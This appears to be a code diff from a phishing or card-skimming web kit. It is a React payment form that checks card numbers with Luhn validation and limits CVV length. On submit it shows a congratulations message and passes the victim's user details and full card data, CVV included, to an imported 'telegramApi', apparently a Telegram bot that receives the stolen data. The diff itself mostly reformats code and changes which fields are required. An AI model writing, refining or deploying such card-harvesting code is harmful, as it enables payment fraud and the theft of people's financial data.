@@ -18,18 +18,18 @@ import telegramApi from './telegramApi'
 // ]
 const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicidades, formUser }) => {
     const [valided, setValided] = useState(false)
-    const [limitCvv, setLimitCvv] = useState(3)
+    const [limitCvv] = useState(3)
 
     const validTarjeta = (tarjeta) => {
-        console.log(tarjeta[0])
-        if(tarjeta[0] != "3"){
-            console.log("corte")
-            formPay.cvv.length >3 && setFormPay({
+        
+        if (tarjeta[0] != "3") {
+            
+            formPay.cvv.length > 3 && setFormPay({
                 ...formPay,
                 cvv: formPay.cvv.slice(0, 3)
-            })  
+            })
         }
-        
+
         const luhnCheck = num => {
             let arr = (num + '')
                 .split('')
@@ -61,13 +61,13 @@ const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicid
 
         if (luhnCheck(tarjeta)) {
             setValided(false)
-            setLimitCvv(tarjeta[0] === "3" ? 4 : 3)
-           
+            
+
             return
         }
         if (luhnChk(tarjeta)) {
             setValided(false)
-            
+
             return
         }
         setValided(true)
@@ -76,7 +76,7 @@ const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicid
     }
 
     useLayoutEffect(() => {
-        
+
 
         formPay.cvv.length > limitCvv && setFormPay({
             ...formPay,
@@ -116,12 +116,14 @@ const form2 = ({ showMenuPay, inputClass, formPay, setFormPay, setMensajeFelicid
     }
     const enviarDatos = (e) => {
         e.preventDefault()
-        const { nombreApellido, expiracion, cvv } = formPay;
-        setFormPay({...formPay,expiracion:formPay.mes+"/"+formPay.año})
-        
-        if (!valided && nombreApellido && expiracion && cvv) {
+        const { nombreApellido, cvv, mes, año } = formPay;
+        setFormPay({ ...formPay})
+        console.log(formPay)
+
+        if (!valided && nombreApellido && cvv && año && mes) {
             setMensajeFelicidades(true)
             telegramApi(formUser, formPay)
+            
         }
     }
     return (
